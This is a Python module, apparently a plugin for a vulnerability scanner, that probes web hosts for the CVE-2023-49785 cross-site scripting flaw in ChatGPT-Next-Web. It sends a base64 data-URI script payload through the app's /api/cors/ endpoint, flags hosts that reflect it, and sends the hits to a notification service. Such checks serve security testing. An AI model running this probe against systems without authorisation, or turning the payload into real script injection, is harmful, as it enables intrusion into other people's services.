
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

bugName = 'ChatGPT-Next-Web XSS漏洞复现(CVE-2023-49785)'


def scan_ChatGPT_Next_Web_XSS_CVE_2023_49785(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    }

    target_url = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(target_url, headers=headers, verify=False, timeout=3, proxies=proxies)
        if req.status_code == 200 and 'alert' in req.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
